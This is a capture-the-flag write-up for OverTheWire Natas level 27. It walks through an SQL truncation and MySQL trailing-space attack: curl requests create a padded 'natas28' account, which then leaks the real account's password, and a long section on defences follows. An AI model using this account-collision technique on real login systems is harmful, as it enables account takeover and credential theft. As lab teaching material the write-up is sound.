# Natas Level 27: SQL Truncation and Trailing Spaces

## The Setup
| Level | Username | Target URL |
| :--- | :--- | :--- |
| Level 27 | natas27 | http://natas27.natas.labs.overthewire.org |

**Introduction:** Level 27 is a masterclass in exploiting subtle database behaviors and logic flaws. This challenge combines SQL truncation vulnerabilities with MySQL's quirky handling of trailing spaces to create an authentication bypass that lets us steal admin credentials. It's the kind of vulnerability that looks secure at first glance but falls apart when you understand how databases really work under the hood.

---

## Hunting for Clues

When I first loaded the page, I saw a clean login form.

![](image-60.png)

The page displays "NATAS27" in large white text on a black header. Below that is a white content area with a simple login form containing two fields: "Username:" and "Password:", each with an empty text input box. Below the inputs is a "login" button. In the lower right corner is a purple "View sourcecode" link. In the upper right is the WeChall "SUBMIT TOKEN" button. The clean interface suggested that the complexity was in the backend logic.

I clicked on the source code to investigate. The code was extensive, so let me break it down function by function:

```php
<?php

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>
```

The database schema shows that both username and password are `varchar(64)`, which means they can hold a maximum of 64 characters. This is critical information.

Let me analyze each function to understand the vulnerability:

### The createUser() Function

```php
function createUser($link, $usr, $pass){
    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}
```

This function has several interesting behaviors:

1. It checks if the username equals its trimmed version to detect leading/trailing spaces
2. It uses `substr($usr, 0, 64)` to truncate the username to 64 characters before inserting

The critical insight here is that if I send 65 characters, the 65th character gets discarded, but the first 64 characters (including any spaces) are kept.

### The checkCredentials() Function

```php
function checkCredentials($link,$usr,$pass){
    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}
```

This function is straightforward, but there's a critical MySQL behavior at play here: **MySQL ignores trailing spaces when comparing strings in WHERE clauses**. This means `"natas28 "` (with trailing spaces) will match `"natas28"` (without spaces) in a comparison.

### The dumpData() Function

```php
function dumpData($link,$usr){
    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                return print_r($row,true);
            }
        }
    }
    return False;
}
```

This is the key to the exploit. Notice that it calls `trim($usr)` before querying. This means if I log in with a username that has trailing spaces, `dumpData()` will strip those spaces and query for the username without spaces instead.

### The Main Logic Flow

```php
if(validUser($link,$_REQUEST["username"])) {
    //user exists, check creds
    if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
        echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
        echo "Here is your data:<br>";
        $data=dumpData($link,$_REQUEST["username"]);
        print htmlentities($data);
    }
}
else {
    //user doesn't exist
    if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
        echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
    }
}
```

The flow checks if the user exists first. If not, it creates the user. If yes, it checks credentials and dumps data.

### The Attack Strategy

Here's how all these pieces fit together:

1. **Assumption**: There's already a user "natas28" in the database with the next level's password
2. **Goal**: Trick the system into showing us natas28's data
3. **Method**: SQL truncation + trailing space behavior

The attack works like this:

**Step 1**: Create a username that's 65 characters long: `"natas28" + 57 spaces + "o"`
- Total length: 7 (natas28) + 57 (spaces) + 1 (o) = 65 characters
- The `validUser()` check won't find this username (it doesn't exist yet)
- The `createUser()` function will truncate to 64 characters, creating: `"natas28" + 57 spaces`
- The trim check passes because the 'o' at position 65 means the string equals its trimmed version
- After truncation, we have a user "natas28" with 57 trailing spaces in the database

**Step 2**: Login with the truncated version: `"natas28" + 57 spaces`
- The `validUser()` check finds our newly created user (MySQL ignores trailing spaces)
- The `checkCredentials()` check passes (we know the password, it's what we just set)
- The `dumpData()` function trims the input, searching for `"natas28"` without spaces
- Since there are two users named "natas28" (the original admin and our padded version), it returns the first one found
- The original "natas28" admin user is likely inserted first, so we get their data!

## Breaking In

First, I needed to craft the payload. The username should be exactly 65 characters: "natas28" plus 57 spaces plus one more character (I used 'o'):

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/natas]
└─$ python3 -c "print('natas28' + ' ' * 57 + 'o')"
natas28                                                         o
```

Perfect! Now I sent the first request to create this user:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/natas]
└─$ curl -u natas27:u3R[REDACTED] -d "username=natas28                                                         o&password=" "http://natas27.natas.labs.overthewire.org/index.php"                                            <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "u3R[REDACTED]" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
User natas28                                                         o was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Excellent! The response confirms: "User natas28                                                         o was created!"

What actually happened in the database:
1. The `validUser()` check looked for the full 65 character username and didn't find it
2. The `createUser()` function passed the trim check (because the 'o' at the end means it equals its trimmed version)
3. The `substr($usr, 0, 64)` truncated the username to 64 characters, removing the 'o'
4. The database now contains a user "natas28" with 57 trailing spaces

Now for the second request. I logged in with the same username but WITHOUT the 'o' at the end (just the 64 characters):

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/natas]
└─$ curl -u natas27:u3R[REDACTED] -d "username=natas28                                                         &password=" "http://natas27.natas.labs.overthewire.org/index.php"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.orthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "u3R[REDACTED]" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
Welcome natas28                                                         !<br>Here is your data:<br>Array
(
    [username] =&gt; natas28
    [password] =&gt; 1JN[REDACTED]
)
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Success! The response shows:
- "Welcome natas28                                                         !" (with all the trailing spaces)
- "Here is your data:"
- An array showing `[username] => natas28` (without spaces!) and `[password] => 1JN[REDACTED]`

The attack worked perfectly! Let me trace through what happened:

**Authentication Flow:**
1. `validUser()` checked for "natas28" + 57 spaces
2. MySQL's trailing space behavior meant it found a match (our newly created user)
3. `checkCredentials()` verified the password (empty string, which we set)
4. `dumpData()` was called with "natas28" + 57 spaces
5. `dumpData()` used `trim()`, converting it to "natas28" with no spaces
6. The query `SELECT * from users where username='natas28'` returned the FIRST matching row
7. The original admin "natas28" was likely inserted before our padded version
8. We got the admin's data, including their password!

### Understanding the Complete Vulnerability

This exploit chains multiple subtle behaviors:

**SQL Truncation**: When the database column is `varchar(64)` and you insert more than 64 characters, the excess is silently truncated. This allows us to bypass the trim check (which looks at the full 65 character input) while creating a username with trailing spaces (after truncation to 64).

**MySQL Trailing Space Behavior**: In MySQL's default configuration, trailing spaces are ignored in string comparisons. This means:
```sql
SELECT * FROM users WHERE username='natas28     '
```
Will match rows where username is `'natas28'` (no spaces) OR `'natas28     '` (with spaces).

**Logic Flaw in Data Retrieval**: The critical bug is that `dumpData()` uses `trim()` on the username before querying. This means:
- We log in as "natas28" + spaces (our created user)
- `dumpData()` searches for "natas28" without spaces
- If multiple users match (which they do, due to trailing space behavior), it returns the first one
- The admin user was created first, so we get their data

### Why This Matters

This type of vulnerability has appeared in real applications:

**Account Takeover**: Attackers can create accounts that collide with existing admin accounts and steal credentials.

**Privilege Escalation**: By exploiting SQL truncation, attackers can bypass validation checks and create privileged accounts.

**Data Leakage**: As demonstrated, flaws in data retrieval can expose other users' sensitive information.

**Authentication Bypass**: The combination of truncation and trailing space behavior can bypass authentication systems.

### Real World Examples

Similar vulnerabilities have been found in:

- **PHP frameworks**: Several frameworks had issues with username truncation in authentication
- **E-commerce platforms**: Some shopping carts were vulnerable to account collision attacks
- **Social networks**: Truncation bugs allowed creating duplicate usernames
- **Banking applications**: Critical systems have been found vulnerable to similar logic flaws

### Comprehensive Mitigation Strategies

Here's how to properly prevent these vulnerabilities:

1. **Enforce Length Limits Before Database Insertion**: Validate input length matches database constraints:
   ```php
   function createUser($link, $usr, $pass){
       // Reject if too long, don't truncate
       if(strlen($usr) > 64 || strlen($pass) > 64) {
           echo "Username or password too long (max 64 characters)";
           return False;
       }
       
       if($usr != trim($usr)) {
           echo "No leading/trailing spaces allowed";
           return False;
       }
       
       $user = mysqli_real_escape_string($link, $usr);
       $password = mysqli_real_escape_string($link, $pass);
       
       $query = "INSERT INTO users (username,password) values ('$user','$password')";
       // ... rest of function
   }
   ```

2. **Use Consistent String Handling**: Don't mix trimmed and untrimmed versions:
   ```php
   function dumpData($link,$usr){
       // Use the SAME handling as other functions
       $user = mysqli_real_escape_string($link, $usr);  // No trim!
       
       $query = "SELECT * from users where username='$user'";
       // ... rest of function
   }
   ```

3. **Configure MySQL for Strict Space Handling**: Use binary collation to make space comparisons strict:
   ```sql
   CREATE TABLE `users` (
     `username` varchar(64) COLLATE utf8_bin NOT NULL,
     `password` varchar(64) NOT NULL,
     UNIQUE KEY `username` (`username`)
   );
   ```
   The `COLLATE utf8_bin` makes comparisons byte-by-byte, so trailing spaces matter.

4. **Add Unique Constraints**: Prevent duplicate usernames in the database:
   ```sql
   ALTER TABLE users ADD UNIQUE INDEX unique_username (username);
   ```

5. **Hash Passwords Properly**: Never store plaintext passwords:
   ```php
   function createUser($link, $usr, $pass){
       $user = mysqli_real_escape_string($link, $usr);
       $password_hash = password_hash($pass, PASSWORD_DEFAULT);
       
       $query = "INSERT INTO users (username,password) values ('$user','$password_hash')";
       // ...
   }
   
   function checkCredentials($link,$usr,$pass){
       $user = mysqli_real_escape_string($link, $usr);
       $query = "SELECT password from users where username='$user'";
       $res = mysqli_query($link, $query);
       
       if($row = mysqli_fetch_assoc($res)) {
           return password_verify($pass, $row['password']);
       }
       return False;
   }
   ```

6. **Use Prepared Statements**: Avoid SQL injection entirely:
   ```php
   function validUser($link,$usr){
       $stmt = $link->prepare("SELECT * from users where username=?");
       $stmt->bind_param("s", $usr);
       $stmt->execute();
       $result = $stmt->get_result();
       return $result->num_rows > 0;
   }
   ```

7. **Normalize All Inputs**: Apply the same normalization everywhere:
   ```php
   function normalizeUsername($username) {
       // Trim, lowercase, remove extra spaces
       $normalized = trim($username);
       $normalized = strtolower($normalized);
       $normalized = preg_replace('/\s+/', ' ', $normalized);
       
       // Enforce length
       if(strlen($normalized) > 64) {
           throw new Exception("Username too long");
       }
       
       // No trailing/leading spaces after normalization
       if($normalized != trim($normalized)) {
           throw new Exception("Invalid username format");
       }
       
       return $normalized;
   }
   ```

8. **Implement Rate Limiting**: Prevent automated exploitation:
   ```php
   // Track failed login attempts
   if($failed_attempts > 5) {
       sleep(5);  // Slow down brute force
   }
   ```

9. **Log and Monitor**: Detect suspicious patterns:
   ```php
   function createUser($link, $usr, $pass){
       // Log user creation attempts
       error_log("User creation attempt: " . json_encode([
           'username' => $usr,
           'length' => strlen($usr),
           'has_trailing_spaces' => $usr != trim($usr),
           'ip' => $_SERVER['REMOTE_ADDR']
       ]));
       
       // ... rest of function
   }
   ```

10. **Regular Security Audits**: Test for edge cases:
    - Usernames with leading spaces
    - Usernames with trailing spaces
    - Usernames at exactly the maximum length
    - Usernames exceeding maximum length
    - Special characters and Unicode in usernames
    - Case sensitivity issues

11. **Framework Authentication**: Use well tested authentication libraries:
    ```php
    // Laravel
    if (Auth::attempt(['email' => $email, 'password' => $password])) {
        // Authentication passed
    }
    
    // Symfony
    $user = $this->getDoctrine()
        ->getRepository(User::class)
        ->findOneBy(['username' => $username]);
    
    if ($passwordEncoder->isPasswordValid($user, $password)) {
        // Authentication passed
    }
    ```

12. **Input Validation Best Practices**:
    ```php
    function validateUsername($username) {
        // Check length BEFORE any processing
        if(strlen($username) < 3 || strlen($username) > 64) {
            return false;
        }
        
        // Check for whitespace
        if(preg_match('/^\s|\s$/', $username)) {
            return false;  // Leading or trailing whitespace
        }
        
        // Only allow alphanumeric and limited special chars
        if(!preg_match('/^[a-zA-Z0-9_-]+$/', $username)) {
            return false;
        }
        
        return true;
    }
    ```

The fundamental lesson is: **never trust database truncation as a security feature**. Always validate input lengths explicitly, use consistent string handling across all functions, and be aware of your database's quirky behaviors with whitespace and collation. Defense in depth means implementing multiple layers of validation, using prepared statements, enforcing unique constraints, and properly hashing passwords.

---

## The Loot

**Next Level Password:** 1JN[REDACTED]

**Quick Recap:** SQL truncation vulnerability combined with MySQL's trailing space behavior in string comparisons and a logic flaw in dumpData's use of trim() allowed creating a username collision with the admin account, leaking their credentials through the data dump function.
